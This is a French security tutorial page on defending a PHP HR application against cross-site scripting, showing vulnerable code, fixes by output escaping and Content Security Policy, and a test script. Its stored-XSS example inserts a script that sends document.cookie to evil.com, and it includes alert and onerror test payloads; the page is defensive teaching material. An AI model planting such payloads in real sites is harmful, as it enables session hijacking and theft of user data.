---
id: xss-protection
title: Protection contre le Cross-Site Scripting (XSS)
sidebar_label: "15.3 Cross-Site Scripting (XSS)"
sidebar_position: 3
---

# 15.3 Protection contre le Cross-Site Scripting (XSS)

## Introduction au Cross-Site Scripting

### Qu'est-ce que le XSS ?

Le Cross-Site Scripting (XSS) permet à un attaquant d'injecter du code JavaScript malveillant dans une page web visualisée par d'autres utilisateurs.

**Impact d'une attaque XSS réussie :**

- Vol de cookies de session (hijacking de compte)
- Redirection vers des sites malveillants (phishing)
- Défacement de page (modification visuelle)
- Keylogging (enregistrement des frappes clavier)
- Vol de données sensibles affichées à l'écran
- Installation de malware via téléchargement automatique

:::danger Classification XSS
**OWASP Top 10 2021 :** A03:2021 – Injection (inclut XSS)  
**CWE-79 :** Improper Neutralization of Input During Web Page Generation  
**CVSS Score :** 6.1 à 7.4 (MEDIUM à HIGH selon le contexte)
:::

---

## Types de XSS

### 15.3.1 XSS Reflected (Réfléchi)

Le code malveillant est **immédiatement renvoyé** par le serveur dans la réponse HTTP, sans être stocké.

```
1. Attaquant crée un lien malveillant avec un script dans l'URL
2. Attaquant envoie ce lien à un employé RH par email
3. L'employé clique sur le lien
4. Le serveur renvoie la page avec le script non échappé
5. Le navigateur exécute le script malveillant
```

### 15.3.2 XSS Stored (Stocké/Persistant)

Le code malveillant est **enregistré dans la base de données** et exécuté à chaque affichage.

```
1. Attaquant soumet un formulaire avec du JavaScript dans un champ texte
2. Le serveur stocke ce contenu en base de données
3. Chaque fois qu'un utilisateur consulte cette page, le script s'exécute
4. Les cookies de session sont envoyés au serveur de l'attaquant
5. L'attaquant peut usurper l'identité de tous les utilisateurs
```

### 15.3.3 XSS DOM-based

La vulnérabilité existe côté client dans le code JavaScript.

```javascript
// Code JavaScript vulnérable
var nom = location.hash.substring(1);
document.getElementById('welcome').innerHTML = "Bienvenue " + nom;
// URL malveillante : site.com/page.html#<img src=x onerror=alert(1)>
```

---

## État Actuel : Code Vulnérable (AVANT)

### 15.3.4 Affichage Direct sans Échappement

```php
<?php
$search = $_GET['search'] ?? '';
$stmt->execute([':search' => '%' . $search . '%']);
$employes = $stmt->fetchAll();
?>
<html>
<body>
    <!-- VULNÉRABILITÉ XSS : affichage direct sans échappement -->
    <p>Résultats pour : <?= $search ?></p>

    <?php foreach ($employes as $emp): ?>
    <tr>
        <td><?= $emp['nom'] ?></td>
        <td><?= $emp['email'] ?></td>
    </tr>
    <?php endforeach; ?>
</body>
</html>
```

**Démonstration d'attaque XSS Reflected :**

```bash
curl "https://rh-interne.atlastech.local/liste.php?search=<script>alert(1)</script>"

# HTML généré par le serveur :
# <p>Résultats pour : <script>alert(1)</script></p>
# Le navigateur EXÉCUTE le script !
```

### 15.3.5 XSS Stored — Données Employés

```sql
-- Données malveillantes insérées en base :
INSERT INTO employes (nom, prenom)
VALUES ('<script>fetch("https://evil.com?c="+document.cookie)</script>', 'Ahmed');

-- Chaque utilisateur qui consulte la liste déclenche le script !
```

---

## Solution : Échappement et Headers de Sécurité (APRÈS)

### 15.3.6 Échappement avec htmlspecialchars()

**Table de conversion :**

| Caractère | Entité HTML | Description |
|-----------|-------------|-------------|
| `<` | `&lt;` | Inférieur à |
| `>` | `&gt;` | Supérieur à |
| `"` | `&quot;` | Guillemet double |
| `'` | `&#039;` | Apostrophe |
| `&` | `&amp;` | Esperluette |

```php
$input = '<script>alert("XSS")</script>';

// AVANT (vulnérable)
echo $input;
// Le navigateur exécute le script !

// APRÈS (sécurisé)
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
// Résultat : &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
// Affiché comme texte, jamais exécuté
```

### 15.3.7 Affichage Sécurisé — Liste des Employés

```php
<?php
function escape_html($string) {
    return htmlspecialchars($string, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

$search = $_GET['search'] ?? '';
?>
<html>
<head>
    <meta http-equiv="Content-Security-Policy" content="
        default-src 'self';
        script-src 'self';
        style-src 'self' 'unsafe-inline';
        frame-ancestors 'none';
    ">
</head>
<body>
    <p>Résultats pour : <strong><?= escape_html($search) ?></strong></p>

    <?php foreach ($employes as $emp): ?>
    <tr>
        <td><?= escape_html($emp['nom']) ?></td>
        <td><?= escape_html($emp['email']) ?></td>
        <td>
            <a href="/voir.php?id=<?= urlencode($emp['id']) ?>">Voir</a>
        </td>
    </tr>
    <?php endforeach; ?>

    <script src="/js/app.js"></script>
</body>
</html>
```

**Test après correction :**

```bash
curl "https://rh-interne.atlastech.local/liste.php?search=<script>alert(1)</script>"

# HTML reçu :
# <p>Résultats pour : <strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong></p>
# Texte affiché littéralement — jamais exécuté
```

### 15.3.8 Échappement dans les Attributs HTML

```php
// VULNÉRABLE
// <input value="<?= $_POST['nom'] ?>">

// SÉCURISÉ
// <input value="<?= escape_html($_POST['nom']) ?>">
// Les guillemets sont échappés en &quot; — aucune injection possible
```

### 15.3.9 Échappement en JavaScript

```php
// VULNÉRABLE
// var name = "<?= $employee['nom'] ?>";

// SÉCURISÉ : utiliser json_encode()
// var name = <?= json_encode($employee['nom'], JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_QUOT) ?>;
```

---

## Content Security Policy (CSP)

### 15.3.10 Configuration Apache

```apache
<VirtualHost 192.168.20.10:443>
    ServerName rh-interne.atlastech.local

    Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; frame-ancestors 'none'; object-src 'none'; base-uri 'self'; form-action 'self';"
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
</VirtualHost>
```

**Explication des directives CSP :**

| Directive | Valeur | Explication |
|-----------|--------|-------------|
| `default-src 'self'` | Même origine | Toutes ressources du même domaine |
| `script-src 'self'` | Scripts locaux | Bloque les scripts inline et externes |
| `style-src 'self' 'unsafe-inline'` | Styles + inline | Autorise CSS inline |
| `frame-ancestors 'none'` | Aucune frame | Prévient clickjacking |
| `object-src 'none'` | Aucun plugin | Bloque Flash, Java |
| `form-action 'self'` | Formulaires internes | Empêche soumission externe |

```bash
# Vérification des headers
curl -I https://rh-interne.atlastech.local/
# content-security-policy: default-src 'self'; ...
# x-frame-options: DENY
```

---

## Protection JavaScript Côté Client

### 15.3.11 Manipulation DOM Sécurisée

```javascript
// VULNÉRABLE
document.getElementById('welcome').innerHTML = "Bienvenue " + userInput;

// SÉCURISÉ — Méthode 1 : textContent
document.getElementById('welcome').textContent = "Bienvenue " + userInput;

// SÉCURISÉ — Méthode 2 : createElement
var textNode = document.createTextNode("Bienvenue " + userInput);
document.getElementById('welcome').appendChild(textNode);
```

```javascript
// Fonction d'échappement HTML en JavaScript
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
```

---

## Tests et Validation

### 15.3.12 Checklist Anti-XSS

```bash
#!/bin/bash
echo "=== Vérification XSS ==="

grep -r "htmlspecialchars" /var/www/html/crud-rh/*.php | wc -l
grep -rn "echo \$_" /var/www/html/crud-rh/*.php
curl -s -I https://rh-interne.atlastech.local/ | grep -i "content-security-policy"

RESPONSE=$(curl -s "https://rh-interne.atlastech.local/liste.php?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E")
if echo "$RESPONSE" | grep -q "&lt;script&gt;"; then
    echo "XSS correctement echappé"
else
    echo "VULNÉRABILITÉ XSS DÉTECTÉE"
fi
```

---

## Résumé

| Aspect | AVANT — Vulnérable | APRÈS — Sécurisé |
|--------|-------------------|------------------|
| Affichage HTML | `<?= $var ?>` | `<?= htmlspecialchars($var, ENT_QUOTES, 'UTF-8') ?>` |
| Données en JS | `var x = "<?= $var ?>"` | `var x = <?= json_encode($var, JSON_HEX_TAG) ?>` |
| URL dans liens | `?id=<?= $id ?>` | `?id=<?= urlencode($id) ?>` |
| Headers HTTP | Aucun | CSP + X-Frame-Options + X-XSS-Protection |
| DOM JavaScript | `innerHTML = input` | `textContent = input` |

### Règles d'Or

1. **Échapper TOUTES les sorties** — `htmlspecialchars()` systématiquement
2. **Contexte d'échappement** — HTML, JS et URL ont chacun leur fonction
3. **CSP strict** — Bloquer les scripts inline non autorisés
4. **Éviter innerHTML** — Préférer `textContent` ou `createElement`
5. **Défense en profondeur** — Validation + Échappement + CSP ensemble

---

## Références

- OWASP Top 10 2021 — A03:2021 Injection
- OWASP XSS Prevention Cheat Sheet
- CWE-79 : Improper Neutralization of Input During Web Page Generation
- Mozilla Developer Network — Content Security Policy (CSP)

:::tip Prochaine Section
La section **15.4 Protection CSRF** abordera les tokens anti-CSRF pour protéger les formulaires contre les soumissions non autorisées.
:::